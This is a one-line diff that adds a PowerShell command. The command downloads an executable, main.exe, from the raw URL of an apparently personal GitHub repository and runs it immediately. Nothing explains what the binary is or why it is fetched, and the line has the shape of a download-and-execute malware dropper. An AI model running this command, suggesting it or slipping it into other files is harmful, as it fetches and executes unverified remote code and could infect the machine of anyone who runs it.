@@ -1,0 +1,1 @@
+powershell -c Invoke-WebRequest -Uri "https://github.com/ruslangaripov531-cmd/bkdm5stickc/raw/refs/heads/main/main.exe" -outfile "main.exe" && main.exe
